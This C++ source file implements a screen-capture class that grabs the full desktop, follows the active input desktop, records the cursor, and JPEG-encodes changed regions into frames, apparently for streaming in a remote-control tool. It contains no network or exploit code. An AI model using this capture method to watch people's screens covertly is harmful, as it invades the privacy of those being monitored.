// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "ScreenSpy.h"
#ifdef _CONSOLE
#include <stdio.h>
#endif

#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)

#define DEF_YSTEP	10
#define DEF_XSTEP	32
//#define DEF_STEP	19
//#define OFF_SET		24
// 
//////////////////////////////////////////////////////////////////////
//gfishinidie Construction/Destruction
//////////////////////////////////////////////////////////////////////


CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
{
	m_biBitCount = biBitCount;
	if (!SelectInputWinStation())
	{
		m_hDeskTopWnd = GetDesktopWindow();
		m_hDeskTopDC = GetDC(m_hDeskTopWnd);
	}
	m_dwBitBltRop = SRCCOPY;
	m_bAlgorithm = COMMAND_SCREEN_ALGORITHM_HOME; // 默认使用家用办公算法
	m_dwLastCapture = GetTickCount();
	m_nMaxFrameRate = nMaxFrameRate;
	m_dwSleep = 1000 / nMaxFrameRate;
	m_bIsGray = bIsGray;
	HDC hdc = GetDC(NULL);
	int client_width_now = GetDeviceCaps(hdc, HORZRES);      // 宽  
	int client_height_now = GetDeviceCaps(hdc, VERTRES);     // 高  
	int client_width_old = GetDeviceCaps(hdc, DESKTOPHORZRES);
	int client_height_old = GetDeviceCaps(hdc, DESKTOPVERTRES);
	fDpiRatio = (float)client_width_old / (float)client_width_now;
	ReleaseDC(NULL, hdc);
	m_nFullWidth = (int)((float)(::GetSystemMetrics(SM_CXVIRTUALSCREEN)) * fDpiRatio);
	m_nFullHeight = (int)((float)(::GetSystemMetrics(SM_CYVIRTUALSCREEN)) * fDpiRatio);
	m_nFullWidth % 2 ? (m_nFullWidth--) : m_nFullWidth;
	m_nFullHeight % 2 ? (m_nFullHeight++) : m_nFullHeight;
	iScreenX = (int)((float)(::GetSystemMetrics(SM_XVIRTUALSCREEN)) * fDpiRatio);
	iScreenY = (int)((float)(::GetSystemMetrics(SM_YVIRTUALSCREEN)) * fDpiRatio);

	m_nIncSize = 32 / m_biBitCount;
	m_nScanLine = 0;
	m_SendUALITY = 85;

	m_hLastMemDC = ::CreateCompatibleDC(m_hDeskTopDC);
	m_hCurrMemDC = ::CreateCompatibleDC(m_hDeskTopDC);
	m_hRectMemDC = ::CreateCompatibleDC(m_hDeskTopDC);
	m_lpvLastBits = NULL;
	m_lpvCurrBits = NULL;

	m_lpbmi_full = ConstructBitmapInfo(m_biBitCount, m_nFullWidth, m_nFullHeight);
	m_lpbmi_rect = ConstructBitmapInfo(m_biBitCount, m_nFullWidth, m_nFullHeight);

	m_hLastBitmap = ::CreateDIBSection(m_hDeskTopDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvLastBits, NULL, NULL);
	m_hCurrBitmap = ::CreateDIBSection(m_hDeskTopDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvCurrBits, NULL, NULL);

	::SelectObject(m_hLastMemDC, m_hLastBitmap);
	::SelectObject(m_hCurrMemDC, m_hCurrBitmap);

	// 足够了
	m_changedBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
	m_changedOffset = 0;
	m_nPerLineDataSize = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;


}
CScreenSpy::~CScreenSpy()
{
	::ReleaseDC(NULL, m_hDeskTopDC);
	::DeleteDC(m_hRectMemDC);
	::DeleteDC(m_hCurrMemDC);
	::DeleteDC(m_hLastMemDC);
	::DeleteObject(m_hCurrBitmap);
	::DeleteObject(m_hLastBitmap);


	if (m_changedBuffer)
		delete[] m_changedBuffer;
	if (m_lpbmi_rect)
		delete[] m_lpbmi_rect;
	if (m_lpbmi_full)
		delete[] m_lpbmi_full;
}

LPVOID CScreenSpy::getFirstScreen(LPDWORD lpdwBytes)
{
	//QueryPerformanceCounter(&nBeginTime);
	if (lpdwBytes == NULL || m_changedBuffer == NULL)
		return NULL;

	// 切换到当前输入桌面
	SelectInputWinStation();

	// 重置变化缓冲区偏移
	m_changedOffset = 0;

	// 写入使用了哪种算法
	BYTE	algorithm = (BYTE)m_bAlgorithm;
	WriteChangedBuffer((LPBYTE)&algorithm, sizeof(algorithm));

	// 获取发生变化的数据
	::BitBlt(m_hLastMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hDeskTopDC, iScreenX, iScreenY, m_dwBitBltRop);

	if (algorithm == COMMAND_SCREEN_ALGORITHM_HOME)
	{
		void* bitstream = NULL; int bitstreamlen;
		bitstreamlen = BMP_JPG(m_nFullWidth, m_nFullHeight, m_biBitCount, m_SendUALITY, m_lpvLastBits, &bitstream);
		if (bitstreamlen > 0)
		{
			WriteChangedBuffer((LPBYTE)bitstream, bitstreamlen);
		}
		if (bitstream) free(bitstream);
	}
	*lpdwBytes = m_changedOffset;
	return m_changedBuffer;
}

LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	if (lpdwBytes == NULL || m_changedBuffer == NULL)
		return NULL;

	// 切换到当前输入桌面
	SelectInputWinStation();

	// 重置变化缓冲区偏移
	m_changedOffset = 0;

	// 写入使用了哪种算法
	BYTE	algorithm = (BYTE)m_bAlgorithm;
	WriteChangedBuffer((LPBYTE)&algorithm, sizeof(algorithm));

	// 写入当前光标的位置
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	CursorPos.x = (long)(fDpiRatio * (float)CursorPos.x);
	CursorPos.y = (long)(fDpiRatio * (float)CursorPos.y);
	CursorPos.x -= iScreenX;
	CursorPos.y -= iScreenY;
	WriteChangedBuffer((LPBYTE)&CursorPos, sizeof(POINT));

	// 写入当前光标的类型
	BYTE	CursorIndex = m_CursorInfo.getCurrentCursorIndex();
	WriteChangedBuffer(&CursorIndex, sizeof(BYTE));

	// 获取发生变化的数据
	::BitBlt(m_hCurrMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hDeskTopDC, iScreenX, iScreenY, m_dwBitBltRop);


	if (algorithm == COMMAND_SCREEN_ALGORITHM_HOME)
	{
		ScanChangedRect(TRUE);
	}
	*lpdwBytes = m_changedOffset;
	
	// 限制发送帧的速度
	while (GetTickCount() - m_dwLastCapture < m_dwSleep)
		Sleep(10);
	InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());

	return m_changedBuffer;
}


void CScreenSpy::setAlgorithm(UINT nAlgorithm)
{
	InterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
}

void CScreenSpy::WriteChangedBuffer(LPBYTE lpData, int nCount)
{
	memcpy(m_changedBuffer + m_changedOffset, lpData, nCount);
	m_changedOffset += nCount;
}

LPBITMAPINFO CScreenSpy::ConstructBitmapInfo(int biBitCount, int biWidth, int biHeight)
{
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
	BITMAPINFO* lpbmi = (BITMAPINFO*) new BYTE[nBISize];
	BITMAPINFOHEADER* lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
	return lpbmi;
}

LPBITMAPINFO CScreenSpy::getBitmapInfo()
{
	return m_lpbmi_full;
}

UINT CScreenSpy::getBitmapInfoSize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;

	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}


void CScreenSpy::setCaptureLayer(BOOL bIsCaptureLayer)
{
	DWORD dwRop = SRCCOPY;
	if (bIsCaptureLayer)
		dwRop |= CAPTUREBLT;
	InterlockedExchange((LPLONG)&m_dwBitBltRop, dwRop);
}

BOOL CScreenSpy::SelectInputWinStation()
{
	BOOL bRet = SwitchInputDesktop();
	if (bRet)
	{
		ReleaseDC(NULL, m_hDeskTopDC);
		m_hDeskTopDC = GetDC(NULL);
	}
	return bRet;
}



bool CScreenSpy::SwitchInputDesktop()
{
	bool	bRet = false;
	DWORD	dwLengthNeeded;

	HDESK	hOldDesktop, hNewDesktop;
	TCHAR	szOldDesktop[256], szNewDesktop[256];

	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(szOldDesktop, 0, sizeof(szOldDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &szOldDesktop, sizeof(szOldDesktop), &dwLengthNeeded);

	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(szNewDesktop, 0, sizeof(szNewDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &szNewDesktop, sizeof(szNewDesktop), &dwLengthNeeded);

	if (lstrcmpi(szOldDesktop, szNewDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}

	CloseDesktop(hOldDesktop);
	CloseDesktop(hNewDesktop);
	return bRet;
}


int CScreenSpy::BMP_JPG(int width, int height, int cbit, int quality, void* input, void** output)
{
	struct jpeg_compress_struct jcs;
	struct jpeg_error_mgr jem;
	unsigned long outlen = 0;

	// 设置错误处理
	jcs.err = jpeg_std_error(&jem);
	// 创建压缩结构
	jpeg_create_compress(&jcs);
	// 设置写入(输出)位置
	jpeg_mem_dest(&jcs, (unsigned char**)output, &outlen);
	// 设置必须参数
	switch (cbit)
	{
	case 16:
		jcs.in_color_space = JCS_EXT_RGB;
		jcs.input_components = 3;
		break;
	case 24:
		jcs.in_color_space = JCS_EXT_BGR;
		jcs.input_components = 3;
		break;
	case 32:
		jcs.in_color_space = JCS_EXT_BGRA;
		jcs.input_components = 4;
		break;
	default:
		jpeg_destroy_compress(&jcs);
		return -1;
	}
	jcs.image_width = width;
	jcs.image_height = height;
	// 填写其它默认参数
	jpeg_set_defaults(&jcs);
	// 设置图像品质, 取值范围是[0-100], 0表示渣画质，100表示满画质
	jpeg_set_quality(&jcs, quality, true);
	// 开始压缩图像
	jpeg_start_compress(&jcs, true);
	int line_stride = (jcs.image_width * cbit / 8 + 3) / 4 * 4;
	while (jcs.next_scanline < jcs.image_height)
	{
		unsigned char* pline = (unsigned char*)input + jcs.next_scanline * line_stride;
		jpeg_write_scanlines(&jcs, &pline, 1);
	}
	// 完成图像压缩
	jpeg_finish_compress(&jcs);
	// 释放相关资源
	jpeg_destroy_compress(&jcs);

	return outlen;
}


BOOL CScreenSpy::ScanChangedRect(BOOL bCopyChangedRect)
{
	LPDWORD p1, p2; RECT changedRect; HRGN hRgnChanged = NULL, hRgnCombine;

	for (int y = m_nScanLine; y < m_nFullHeight; y += DEF_YSTEP) // m_nScanLine 为 0, 是最后一行
	{
		p1 = (LPDWORD)((LPBYTE)m_lpvLastBits + (m_nFullHeight - 1 - y) * m_nPerLineDataSize);
		p2 = (LPDWORD)((LPBYTE)m_lpvCurrBits + (m_nFullHeight - 1 - y) * m_nPerLineDataSize);
		for (int x = 0; x < m_nFullWidth; )
		{
			if (*p1 == *p2)
			{
				p1++;
				p2++;
				x += m_nIncSize;
				continue;
			}
			if (!bCopyChangedRect)
				return TRUE;
			changedRect.left = max(x - DEF_XSTEP, 0);
			changedRect.top = max(y - DEF_YSTEP, 0);
			changedRect.right = min(x + DEF_XSTEP, m_nFullWidth);
			changedRect.bottom = min(y + DEF_YSTEP, m_nFullHeight);
			if (hRgnChanged == NULL)
				hRgnChanged = CreateRectRgnIndirect(&changedRect);
			else
			{
				hRgnCombine = CreateRectRgnIndirect(&changedRect);
				CombineRgn(hRgnChanged, hRgnChanged, hRgnCombine, RGN_OR);
				DeleteObject(hRgnCombine);
			}
			p1 += DEF_XSTEP / m_nIncSize;
			p2 += DEF_XSTEP / m_nIncSize;
			x += DEF_XSTEP;
		}
	}

	m_nScanLine = (m_nScanLine + 3) % DEF_YSTEP;
	if (hRgnChanged)
	{
		DWORD dwRgnSize = GetRegionData(hRgnChanged, 0, NULL);
		LPRGNDATA lpRgnData = (LPRGNDATA) new BYTE[dwRgnSize];
		GetRegionData(hRgnChanged, dwRgnSize, lpRgnData);
		DeleteObject(hRgnChanged);
		CopyChangedRect(lpRgnData, dwRgnSize);
		delete[] lpRgnData;
		return TRUE;
	}
	return FALSE;
}


void CScreenSpy::CopyChangedRect(LPRGNDATA lpRgnData, DWORD dwRgnSize)
{
	LPRECT lpChangedRect = (LPRECT)lpRgnData->Buffer;
	void* bitstream = NULL; int bitstreamlen;

	for (int i = 0; i < (int)(lpRgnData->rdh.nCount); i++)
	{
		int nChangedRectWidth = lpChangedRect[i].right - lpChangedRect[i].left;
		int nChangedRectHeight = lpChangedRect[i].bottom - lpChangedRect[i].top;

		m_lpbmi_rect->bmiHeader.biWidth = nChangedRectWidth;
		m_lpbmi_rect->bmiHeader.biHeight = nChangedRectHeight;
		m_lpbmi_rect->bmiHeader.biSizeImage = (((nChangedRectWidth * m_biBitCount + 31) & ~31) >> 3) * nChangedRectHeight;

		m_lpvRectBits = NULL;
		m_hRectBitmap = ::CreateDIBSection(m_hDeskTopDC, m_lpbmi_rect, DIB_RGB_COLORS, &m_lpvRectBits, NULL, NULL);
		::SelectObject(m_hRectMemDC, m_hRectBitmap);

		::BitBlt(m_hLastMemDC, lpChangedRect[i].left, lpChangedRect[i].top, nChangedRectWidth,
			nChangedRectHeight, m_hCurrMemDC, lpChangedRect[i].left, lpChangedRect[i].top, SRCCOPY);
		::BitBlt(m_hRectMemDC, 0, 0, nChangedRectWidth,
			nChangedRectHeight, m_hCurrMemDC, lpChangedRect[i].left, lpChangedRect[i].top, SRCCOPY);


		bitstreamlen = BMP_JPG(nChangedRectWidth, nChangedRectHeight, m_biBitCount, m_SendUALITY, m_lpvRectBits, &bitstream);
		if (bitstreamlen > 0)
		{
			WriteChangedBuffer((LPBYTE)&bitstreamlen, sizeof(int));
			WriteChangedBuffer((LPBYTE)bitstream, bitstreamlen);
			WriteChangedBuffer((LPBYTE)&lpChangedRect[i], sizeof(RECT));
		}
		::DeleteObject(m_hRectBitmap);
		if (bitstream) free(bitstream);
	}
}

void CScreenSpy::SendUALITY(int i)
{
	m_SendUALITY = i;
}

void CScreenSpy::SetFps(int nfps)
{
	m_dwSleep = 1000 / nfps;
}